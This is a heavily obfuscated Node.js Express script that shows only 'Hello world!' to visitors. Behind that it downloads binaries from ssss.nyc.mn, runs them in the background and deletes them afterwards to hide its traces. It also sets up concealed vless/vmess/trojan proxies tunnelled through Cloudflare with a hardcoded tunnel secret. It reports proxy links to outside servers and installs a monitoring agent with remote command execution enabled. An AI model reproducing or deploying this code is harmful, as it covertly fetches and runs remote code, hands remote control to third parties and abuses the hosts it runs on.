const _0x4ddb82=_0x4ef3;(function(_0x154f70,_0x4fae40){const _0x2bd820=_0x4ef3,_0x827a98=_0x154f70();while(!![]){try{const _0x5ef100=-parseInt(_0x2bd820(0xf4))/0x1*(-parseInt(_0x2bd820(0xd5))/0x2)+parseInt(_0x2bd820(0x128))/0x3*(parseInt(_0x2bd820(0x155))/0x4)+-parseInt(_0x2bd820(0x16d))/0x5+-parseInt(_0x2bd820(0x10a))/0x6+parseInt(_0x2bd820(0x161))/0x7+-parseInt(_0x2bd820(0x13d))/0x8+parseInt(_0x2bd820(0x10e))/0x9*(parseInt(_0x2bd820(0x11f))/0xa);if(_0x5ef100===_0x4fae40)break;else _0x827a98['push'](_0x827a98['shift']());}catch(_0x4b974a){_0x827a98['push'](_0x827a98['shift']());}}}(_0x3508,0xb0dc1));const express=require(_0x4ddb82(0x14a)),app=express(),axios=require(_0x4ddb82(0x15a)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x4ddb82(0x174))[_0x4ddb82(0x184)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4ddb82(0xf8)][_0x4ddb82(0x163)]||'',PROJECT_URL=process[_0x4ddb82(0xf8)][_0x4ddb82(0x18c)]||'',AUTO_ACCESS=process['env'][_0x4ddb82(0xef)]||![],FILE_PATH=process[_0x4ddb82(0xf8)][_0x4ddb82(0x185)]||'./tmp',SUB_PATH=process[_0x4ddb82(0xf8)]['SUB_PATH']||_0x4ddb82(0xec),PORT=process[_0x4ddb82(0xf8)][_0x4ddb82(0x137)]||process[_0x4ddb82(0xf8)][_0x4ddb82(0x183)]||0xbb8,UUID=process[_0x4ddb82(0xf8)]['UUID']||'d56b1b53-b402-46d9-8abf-5c3882930970',NEZHA_SERVER=process[_0x4ddb82(0xf8)][_0x4ddb82(0x111)]||'',NEZHA_PORT=process[_0x4ddb82(0xf8)][_0x4ddb82(0xfe)]||'',NEZHA_KEY=process[_0x4ddb82(0xf8)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4ddb82(0xf8)][_0x4ddb82(0x172)]||_0x4ddb82(0x117),ARGO_AUTH=process[_0x4ddb82(0xf8)][_0x4ddb82(0x112)]||_0x4ddb82(0x13b),ARGO_PORT=process['env'][_0x4ddb82(0xf3)]||0x1f41,CFIP=process[_0x4ddb82(0xf8)][_0x4ddb82(0x107)]||_0x4ddb82(0x13c),CFPORT=process[_0x4ddb82(0xf8)][_0x4ddb82(0x187)]||0x1bb,NAME=process['env']['NAME']||'Vls';!fs['existsSync'](FILE_PATH)?(fs[_0x4ddb82(0x109)](FILE_PATH),console[_0x4ddb82(0x15b)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x4ddb82(0x15f));let npmPath=path['join'](FILE_PATH,_0x4ddb82(0x139)),phpPath=path[_0x4ddb82(0xf0)](FILE_PATH,_0x4ddb82(0x16e)),webPath=path[_0x4ddb82(0xf0)](FILE_PATH,_0x4ddb82(0x123)),botPath=path[_0x4ddb82(0xf0)](FILE_PATH,'bot'),subPath=path[_0x4ddb82(0xf0)](FILE_PATH,_0x4ddb82(0x102)),listPath=path[_0x4ddb82(0xf0)](FILE_PATH,_0x4ddb82(0x158)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x4ddb82(0x180));function deleteNodes(){const _0x52116c=_0x4ddb82;try{if(!UPLOAD_URL)return;if(!fs[_0x52116c(0x136)](subPath))return;let _0xee3cf6;try{_0xee3cf6=fs[_0x52116c(0x17b)](subPath,'utf-8');}catch{return null;}const _0x287373=Buffer[_0x52116c(0xf1)](_0xee3cf6,_0x52116c(0x135))[_0x52116c(0x114)](_0x52116c(0xde)),_0x1ebb09=_0x287373[_0x52116c(0x141)]('\x0a')['filter'](_0x491704=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x52116c(0xd4)](_0x491704));if(_0x1ebb09[_0x52116c(0xe6)]===0x0)return;return axios[_0x52116c(0x151)](UPLOAD_URL+_0x52116c(0xeb),JSON[_0x52116c(0x18f)]({'nodes':_0x1ebb09}),{'headers':{'Content-Type':_0x52116c(0x106)}})[_0x52116c(0xdf)](_0xc083a9=>{return null;});}catch(_0x39db18){return null;}}function cleanupOldFiles(){const _0x312455=_0x4ddb82,_0x4d0cce=[_0x312455(0x123),_0x312455(0xf5),_0x312455(0x139),_0x312455(0x16e),_0x312455(0x102),_0x312455(0x176)];_0x4d0cce[_0x312455(0x16b)](_0x1c77ee=>{const _0x2ace0d=_0x312455,_0x464479=path[_0x2ace0d(0xf0)](FILE_PATH,_0x1c77ee);fs['unlink'](_0x464479,()=>{});});}app['get']('/',function(_0x38ae58,_0x22b633){const _0x237e39=_0x4ddb82;_0x22b633[_0x237e39(0x142)](_0x237e39(0x14c));});function _0x3508(){const _0x5ad1a6=['automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/2go','\x20>/dev/null\x202>&1\x20&','status','all','\x0a\x20\x20\x0atrojan://','utf-8','catch','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arch','web\x20is\x20running','\x0a\x20\x20credentials-file:\x20','&type=ws&host=','./php','length','fileUrl','nohup\x20','./web','/trojan-argo','/api/delete-nodes','sub','listen','web\x20running\x20error:\x20','AUTO_ACCESS','join','from','then','ARGO_PORT','3ogfXBq','bot','direct','npm\x20running\x20error:\x20','env','/config.json\x20>/dev/null\x202>&1\x20&','config.yaml','\x0a\x20\x20\x20\x20','tcp','vmess','NEZHA_PORT','false','https://arm64.ssss.nyc.mn/v1','2096','sub.txt','clear','has','./bot','application/json','CFIP','true','mkdirSync','8223732lftmqT','amd','\x20>/dev/null\x202>&1','\x0aclient_secret:\x20','14259420DtCsKI','Download\x20','blackhole','NEZHA_SERVER','ARGO_AUTH','Content-Type','toString','unshift','./npm','galaxy2.tyanxk.dpdns.org','quic','php\x20is\x20running','response','rm\x20-rf\x20','/sub.txt\x20saved\x20successfully','chmod','443','10fciUPl','\x0a\x20\x20\x0avmess://','trim','App\x20is\x20running','web','Error\x20executing\x20command:\x20','\x0a\x20\x20tunnel:\x20','none','arm','12912OVEiOJ','Empowerment\x20failed\x20for\x20','\x20-p\x20','2083','createWriteStream','text/plain;\x20charset=utf-8','unlink','aarch64','push','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Empowerment\x20success\x20for\x20','includes','8443','base64','existsSync','SERVER_PORT','map','npm','--tls','{\x22AccountTag\x22:\x22672ed93c49680824d4343348af3b567a\x22,\x22TunnelSecret\x22:\x22bmFTBJYnzm0aOqtHJE69AXMFEJ1f9bbzDd+uJPLkZhU=\x22,\x22TunnelID\x22:\x22c4ae02a0-752b-4c2f-ade9-c3d325589bf1\x22,\x22Endpoint\x22:\x22\x22}','www.visa.com.sg','8205080JvyAMp','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','error','split','send','ArgoDomain:','writeFileSync','Subscription\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/v1','message','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','express','arm64','Hello\x20world!','ARGO_DOMAIN:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20downloading\x20files:','/vmess-argo?ed=2560','post','\x20failed:\x20','vless','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','1004Fgywrz','php\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/web','list.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','axios','log','set','/vmess-argo','pipe','\x20already\x20exists','127.0.0.1','5548417zqVHkb','freedom','UPLOAD_URL','stream','tls','npm\x20is\x20running','Error\x20reading\x20boot.log:','/tunnel.yml\x20run','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel.json','forEach','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','1995460cBkpgj','php','?security=tls&sni=','trojan','https://amd64.ssss.nyc.mn/agent','ARGO_DOMAIN','/api/add-subscriptions','child_process','block','boot.log','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://arm64.ssss.nyc.mn/agent','2053','tunnel.yml','readFileSync','/vless-argo','Skipping\x20adding\x20automatic\x20access\x20task','TunnelSecret','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','config.json','https+local://8.8.8.8/dns-query','match','PORT','exec','FILE_PATH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','CFPORT','/npm\x20-s\x20','xtls-rprx-vision','&path=%2Fvless-argo%3Fed%3D2560#','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','PROJECT_URL','/web\x20-c\x20','http','stringify','unlinkSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','close','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','添加URL失败:\x20','test','41634vdtwoL','/bot\x20','&path=%2Ftrojan-argo%3Fed%3D2560#'];_0x3508=function(){return _0x5ad1a6;};return _0x3508();}const config={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4ddb82(0x153),'settings':{'clients':[{'id':UUID,'flow':_0x4ddb82(0x189)}],'decryption':_0x4ddb82(0x126),'fallbacks':[{'dest':0xbb9},{'path':_0x4ddb82(0x17c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4ddb82(0xea),'dest':0xbbc}]},'streamSettings':{'network':_0x4ddb82(0xfc)}},{'port':0xbb9,'listen':_0x4ddb82(0x160),'protocol':_0x4ddb82(0x153),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x4ddb82(0xfc),'security':_0x4ddb82(0x126)}},{'port':0xbba,'listen':_0x4ddb82(0x160),'protocol':_0x4ddb82(0x153),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4ddb82(0x126)},'streamSettings':{'network':'ws','security':_0x4ddb82(0x126),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4ddb82(0x18e),_0x4ddb82(0x165),_0x4ddb82(0x118)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4ddb82(0x160),'protocol':_0x4ddb82(0xfd),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4ddb82(0x15d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4ddb82(0x165),_0x4ddb82(0x118)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x4ddb82(0x170),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4ddb82(0x126),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4ddb82(0x18e),_0x4ddb82(0x165),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4ddb82(0x181)]},'outbounds':[{'protocol':_0x4ddb82(0x162),'tag':_0x4ddb82(0xf6)},{'protocol':_0x4ddb82(0x110),'tag':_0x4ddb82(0x175)}]};fs[_0x4ddb82(0x144)](path[_0x4ddb82(0xf0)](FILE_PATH,_0x4ddb82(0x180)),JSON[_0x4ddb82(0x18f)](config,null,0x2));function getSystemArchitecture(){const _0x42f255=_0x4ddb82,_0x28e8b6=os[_0x42f255(0xe1)]();return _0x28e8b6===_0x42f255(0x127)||_0x28e8b6===_0x42f255(0x14b)||_0x28e8b6===_0x42f255(0x12f)?_0x42f255(0x127):_0x42f255(0x10b);}function downloadFile(_0x56c1ee,_0x5cbbf3,_0x40fe96){const _0x4e2181=_0x4ddb82,_0x29e60c=path[_0x4e2181(0xf0)](FILE_PATH,_0x56c1ee),_0x37f7b9=fs[_0x4e2181(0x12c)](_0x29e60c);axios({'method':'get','url':_0x5cbbf3,'responseType':_0x4e2181(0x164)})[_0x4e2181(0xf2)](_0xecb3e9=>{const _0x182444=_0x4e2181;_0xecb3e9['data'][_0x182444(0x15e)](_0x37f7b9),_0x37f7b9['on']('finish',()=>{const _0x15639f=_0x182444;_0x37f7b9[_0x15639f(0x192)](),console[_0x15639f(0x15b)](_0x15639f(0x10f)+_0x56c1ee+'\x20successfully'),_0x40fe96(null,_0x56c1ee);}),_0x37f7b9['on']('error',_0x30f77a=>{const _0x221cb8=_0x182444;fs[_0x221cb8(0x12e)](_0x29e60c,()=>{});const _0x3b0087='Download\x20'+_0x56c1ee+_0x221cb8(0x152)+_0x30f77a[_0x221cb8(0x147)];console['error'](_0x3b0087),_0x40fe96(_0x3b0087);});})[_0x4e2181(0xdf)](_0x49ad5c=>{const _0x3b185a=_0x4e2181,_0x2b5fb9=_0x3b185a(0x10f)+_0x56c1ee+_0x3b185a(0x152)+_0x49ad5c[_0x3b185a(0x147)];console[_0x3b185a(0x140)](_0x2b5fb9),_0x40fe96(_0x2b5fb9);});}async function downloadFilesAndRun(){const _0x4f2e90=_0x4ddb82,_0xd15d68=getSystemArchitecture(),_0x7fc561=getFilesForArchitecture(_0xd15d68);if(_0x7fc561['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2cc856=_0x7fc561[_0x4f2e90(0x138)](_0x5420ab=>{return new Promise((_0x1b4d46,_0x1b32d9)=>{const _0x35f74e=_0x4ef3;downloadFile(_0x5420ab['fileName'],_0x5420ab[_0x35f74e(0xe7)],(_0x13504e,_0x17230f)=>{_0x13504e?_0x1b32d9(_0x13504e):_0x1b4d46(_0x17230f);});});});try{await Promise[_0x4f2e90(0xdc)](_0x2cc856);}catch(_0x25341e){console[_0x4f2e90(0x140)](_0x4f2e90(0x14f),_0x25341e);return;}function _0x277b88(_0x465b05){const _0x136361=_0x4f2e90,_0x499744=0x1fd;_0x465b05[_0x136361(0x16b)](_0x389bba=>{const _0x23d6f2=_0x136361,_0x2756bc=path[_0x23d6f2(0xf0)](FILE_PATH,_0x389bba);fs[_0x23d6f2(0x136)](_0x2756bc)&&fs[_0x23d6f2(0x11d)](_0x2756bc,_0x499744,_0x40db31=>{const _0x33b768=_0x23d6f2;_0x40db31?console[_0x33b768(0x140)](_0x33b768(0x129)+_0x2756bc+':\x20'+_0x40db31):console[_0x33b768(0x15b)](_0x33b768(0x132)+_0x2756bc+':\x20'+_0x499744[_0x33b768(0x114)](0x8));});});}const _0x4c3801=NEZHA_PORT?[_0x4f2e90(0x116),_0x4f2e90(0xe9),'./bot']:[_0x4f2e90(0xe5),_0x4f2e90(0xe9),_0x4f2e90(0x105)];_0x277b88(_0x4c3801);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x108d24=NEZHA_SERVER[_0x4f2e90(0x133)](':')?NEZHA_SERVER[_0x4f2e90(0x141)](':')['pop']():'',_0x473cbd=new Set([_0x4f2e90(0x11e),'8443','2096',_0x4f2e90(0x148),_0x4f2e90(0x12b),_0x4f2e90(0x179)]),_0x5814c3=_0x473cbd[_0x4f2e90(0x104)](_0x108d24)?_0x4f2e90(0x108):_0x4f2e90(0xff),_0xe1361b=_0x4f2e90(0x10d)+NEZHA_KEY+_0x4f2e90(0x191)+NEZHA_SERVER+_0x4f2e90(0x18b)+_0x5814c3+_0x4f2e90(0x131)+UUID;fs['writeFileSync'](path[_0x4f2e90(0xf0)](FILE_PATH,_0x4f2e90(0xfa)),_0xe1361b);const _0x284e64='nohup\x20'+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x284e64),console[_0x4f2e90(0x15b)](_0x4f2e90(0x119)),await new Promise(_0x337f09=>setTimeout(_0x337f09,0x3e8));}catch(_0x27d138){console[_0x4f2e90(0x140)](_0x4f2e90(0x156)+_0x27d138);}}else{let _0x303ec4='';const _0x2e612b=[_0x4f2e90(0x11e),_0x4f2e90(0x134),_0x4f2e90(0x101),'2087',_0x4f2e90(0x12b),_0x4f2e90(0x179)];_0x2e612b[_0x4f2e90(0x133)](NEZHA_PORT)&&(_0x303ec4=_0x4f2e90(0x13a));const _0x51225f=_0x4f2e90(0xe8)+FILE_PATH+_0x4f2e90(0x188)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4f2e90(0x12a)+NEZHA_KEY+'\x20'+_0x303ec4+_0x4f2e90(0xda);try{await exec(_0x51225f),console[_0x4f2e90(0x15b)](_0x4f2e90(0x166)),await new Promise(_0x3d58f1=>setTimeout(_0x3d58f1,0x3e8));}catch(_0x2b9710){console[_0x4f2e90(0x140)](_0x4f2e90(0xf7)+_0x2b9710);}}}else console[_0x4f2e90(0x15b)](_0x4f2e90(0x169));const _0x5af77f='nohup\x20'+FILE_PATH+_0x4f2e90(0x18d)+FILE_PATH+_0x4f2e90(0xf9);try{await exec(_0x5af77f),console[_0x4f2e90(0x15b)](_0x4f2e90(0xe2)),await new Promise(_0x3968f2=>setTimeout(_0x3968f2,0x3e8));}catch(_0x159c2f){console[_0x4f2e90(0x140)](_0x4f2e90(0xee)+_0x159c2f);}if(fs[_0x4f2e90(0x136)](path[_0x4f2e90(0xf0)](FILE_PATH,'bot'))){let _0x7f012c;if(ARGO_AUTH[_0x4f2e90(0x182)](/^[A-Z0-9a-z=]{120,250}$/))_0x7f012c=_0x4f2e90(0xe0)+ARGO_AUTH;else ARGO_AUTH[_0x4f2e90(0x182)](/TunnelSecret/)?_0x7f012c='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4f2e90(0x168):_0x7f012c=_0x4f2e90(0x149)+FILE_PATH+_0x4f2e90(0x14e)+ARGO_PORT;try{await exec(_0x4f2e90(0xe8)+FILE_PATH+_0x4f2e90(0xd6)+_0x7f012c+_0x4f2e90(0xda)),console[_0x4f2e90(0x15b)]('bot\x20is\x20running'),await new Promise(_0x251f69=>setTimeout(_0x251f69,0x7d0));}catch(_0x416673){console[_0x4f2e90(0x140)](_0x4f2e90(0x124)+_0x416673);}}await new Promise(_0xbb489c=>setTimeout(_0xbb489c,0x1388));}function _0x4ef3(_0x267201,_0x38d7df){const _0x35089f=_0x3508();return _0x4ef3=function(_0x4ef389,_0x5a838a){_0x4ef389=_0x4ef389-0xd3;let _0x23b7b6=_0x35089f[_0x4ef389];return _0x23b7b6;},_0x4ef3(_0x267201,_0x38d7df);}function getFilesForArchitecture(_0x4535e7){const _0x111eb0=_0x4ddb82;let _0x4179aa;_0x4535e7===_0x111eb0(0x127)?_0x4179aa=[{'fileName':_0x111eb0(0x123),'fileUrl':_0x111eb0(0x157)},{'fileName':_0x111eb0(0xf5),'fileUrl':_0x111eb0(0xd9)}]:_0x4179aa=[{'fileName':_0x111eb0(0x123),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x111eb0(0xf5),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xd50d68=_0x4535e7===_0x111eb0(0x127)?_0x111eb0(0x178):_0x111eb0(0x171);_0x4179aa[_0x111eb0(0x115)]({'fileName':'npm','fileUrl':_0xd50d68});}else{const _0x250a45=_0x4535e7===_0x111eb0(0x127)?_0x111eb0(0x100):_0x111eb0(0x146);_0x4179aa['unshift']({'fileName':'php','fileUrl':_0x250a45});}}return _0x4179aa;}function argoType(){const _0x9815d0=_0x4ddb82;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x9815d0(0x193));return;}if(ARGO_AUTH[_0x9815d0(0x133)](_0x9815d0(0x17e))){fs[_0x9815d0(0x144)](path[_0x9815d0(0xf0)](FILE_PATH,_0x9815d0(0x16a)),ARGO_AUTH);const _0x4fbbb8=_0x9815d0(0x125)+ARGO_AUTH['split']('\x22')[0xb]+_0x9815d0(0xe3)+path['join'](FILE_PATH,_0x9815d0(0x16a))+_0x9815d0(0x13e)+ARGO_DOMAIN+_0x9815d0(0x159)+ARGO_PORT+_0x9815d0(0x186);fs['writeFileSync'](path[_0x9815d0(0xf0)](FILE_PATH,_0x9815d0(0x17a)),_0x4fbbb8);}else console[_0x9815d0(0x15b)](_0x9815d0(0x177));}argoType();async function extractDomains(){const _0x11de59=_0x4ddb82;let _0xe23af0;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe23af0=ARGO_DOMAIN,console['log'](_0x11de59(0x14d),_0xe23af0),await _0x2728d9(_0xe23af0);else try{const _0x368730=fs['readFileSync'](path[_0x11de59(0xf0)](FILE_PATH,_0x11de59(0x176)),'utf-8'),_0x4c5d4e=_0x368730[_0x11de59(0x141)]('\x0a'),_0x1bdad5=[];_0x4c5d4e[_0x11de59(0x16b)](_0x801b77=>{const _0x1f7b38=_0x11de59,_0x19f044=_0x801b77[_0x1f7b38(0x182)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x19f044){const _0x2bc18d=_0x19f044[0x1];_0x1bdad5[_0x1f7b38(0x130)](_0x2bc18d);}});if(_0x1bdad5[_0x11de59(0xe6)]>0x0)_0xe23af0=_0x1bdad5[0x0],console['log'](_0x11de59(0x143),_0xe23af0),await _0x2728d9(_0xe23af0);else{console['log'](_0x11de59(0x154)),fs[_0x11de59(0x190)](path['join'](FILE_PATH,_0x11de59(0x176)));async function _0x37fe9f(){const _0x4c8f11=_0x11de59;try{await exec(_0x4c8f11(0x13f));}catch(_0x296340){}}_0x37fe9f(),await new Promise(_0x58d635=>setTimeout(_0x58d635,0xbb8));const _0x46a8af=_0x11de59(0x149)+FILE_PATH+_0x11de59(0x14e)+ARGO_PORT;try{await exec(_0x11de59(0xe8)+path[_0x11de59(0xf0)](FILE_PATH,_0x11de59(0xf5))+'\x20'+_0x46a8af+_0x11de59(0xda)),console[_0x11de59(0x15b)]('bot\x20is\x20running.'),await new Promise(_0x868b1b=>setTimeout(_0x868b1b,0xbb8)),await extractDomains();}catch(_0xd6988d){console['error'](_0x11de59(0x124)+_0xd6988d);}}}catch(_0x1215a4){console[_0x11de59(0x140)](_0x11de59(0x167),_0x1215a4);}async function _0x2728d9(_0x16b9fc){const _0x18033f=_0x11de59,_0x48e236=execSync(_0x18033f(0x16c),{'encoding':_0x18033f(0xde)}),_0x32ba36=_0x48e236[_0x18033f(0x121)]();return new Promise(_0x3e40af=>{setTimeout(()=>{const _0x45c5c3=_0x4ef3,_0x371cf0={'v':'2','ps':NAME+'-'+_0x32ba36,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x45c5c3(0x126),'host':_0x16b9fc,'path':_0x45c5c3(0x150),'tls':'tls','sni':_0x16b9fc,'alpn':''},_0x401d3c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x16b9fc+_0x45c5c3(0xe4)+_0x16b9fc+_0x45c5c3(0x18a)+NAME+'-'+_0x32ba36+_0x45c5c3(0x120)+Buffer['from'](JSON[_0x45c5c3(0x18f)](_0x371cf0))[_0x45c5c3(0x114)](_0x45c5c3(0x135))+_0x45c5c3(0xdd)+UUID+'@'+CFIP+':'+CFPORT+_0x45c5c3(0x16f)+_0x16b9fc+'&type=ws&host='+_0x16b9fc+_0x45c5c3(0xd7)+NAME+'-'+_0x32ba36+_0x45c5c3(0xfb);console[_0x45c5c3(0x15b)](Buffer[_0x45c5c3(0xf1)](_0x401d3c)[_0x45c5c3(0x114)](_0x45c5c3(0x135))),fs[_0x45c5c3(0x144)](subPath,Buffer[_0x45c5c3(0xf1)](_0x401d3c)[_0x45c5c3(0x114)](_0x45c5c3(0x135))),console[_0x45c5c3(0x15b)](FILE_PATH+_0x45c5c3(0x11c)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x5edad2,_0x29214e)=>{const _0x580441=_0x45c5c3,_0x5e25eb=Buffer[_0x580441(0xf1)](_0x401d3c)['toString']('base64');_0x29214e[_0x580441(0x15c)](_0x580441(0x113),_0x580441(0x12d)),_0x29214e['send'](_0x5e25eb);}),_0x3e40af(_0x401d3c);},0x7d0);});}}async function uplodNodes(){const _0x12732a=_0x4ddb82;if(UPLOAD_URL&&PROJECT_URL){const _0x5564b4=PROJECT_URL+'/'+SUB_PATH,_0x4c6b4b={'subscription':[_0x5564b4]};try{const _0x4b8b14=await axios[_0x12732a(0x151)](UPLOAD_URL+_0x12732a(0x173),_0x4c6b4b,{'headers':{'Content-Type':_0x12732a(0x106)}});if(_0x4b8b14[_0x12732a(0xdb)]===0xc8)console[_0x12732a(0x15b)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x14c7c8){if(_0x14c7c8[_0x12732a(0x11a)]){if(_0x14c7c8[_0x12732a(0x11a)][_0x12732a(0xdb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x12732a(0x136)](listPath))return;const _0x270df2=fs[_0x12732a(0x17b)](listPath,_0x12732a(0xde)),_0x387bac=_0x270df2[_0x12732a(0x141)]('\x0a')['filter'](_0x17fd4a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x12732a(0xd4)](_0x17fd4a));if(_0x387bac[_0x12732a(0xe6)]===0x0)return;const _0x18b7c1=JSON[_0x12732a(0x18f)]({'nodes':_0x387bac});try{await axios[_0x12732a(0x151)](UPLOAD_URL+'/api/add-nodes',_0x18b7c1,{'headers':{'Content-Type':_0x12732a(0x106)}});if(response[_0x12732a(0xdb)]===0xc8)console[_0x12732a(0x15b)](_0x12732a(0x145));else return null;}catch(_0x17d3d4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x50fb35=_0x4ef3,_0x5c5cc4=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x5c5cc4[_0x50fb35(0x130)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5c5cc4[_0x50fb35(0x130)](phpPath);exec(_0x50fb35(0x11b)+_0x5c5cc4['join']('\x20')+_0x50fb35(0x10c),_0x3a4f86=>{const _0x4e87d9=_0x50fb35;console[_0x4e87d9(0x103)](),console[_0x4e87d9(0x15b)](_0x4e87d9(0x122)),console[_0x4e87d9(0x15b)](_0x4e87d9(0x17f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3d6d24=_0x4ddb82;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3d6d24(0x15b)](_0x3d6d24(0x17d));return;}try{const _0x370c69=await axios[_0x3d6d24(0x151)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x3d6d24(0x15b)](_0x3d6d24(0xd8));}catch(_0x18a43e){console[_0x3d6d24(0x140)](_0x3d6d24(0xd3)+_0x18a43e[_0x3d6d24(0x147)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4ddb82(0xed)](PORT,()=>console[_0x4ddb82(0x15b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
